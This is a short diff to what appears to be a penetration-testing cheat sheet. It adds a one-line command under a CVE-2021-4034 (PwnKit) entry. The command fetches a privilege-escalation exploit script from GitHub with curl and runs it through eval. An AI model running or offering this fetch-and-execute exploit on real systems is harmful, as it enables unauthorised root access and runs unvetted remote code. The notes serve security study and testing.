@@ -167,6 +167,7 @@ ssh -L YOUR_PORT:localhost:PORT_EXPOSED user@IP
 CVE-2021-4034
 ```markdown
 https://github.com/berdav/CVE-2021-4034
+One liner : eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
 ```
 
 ### Windows
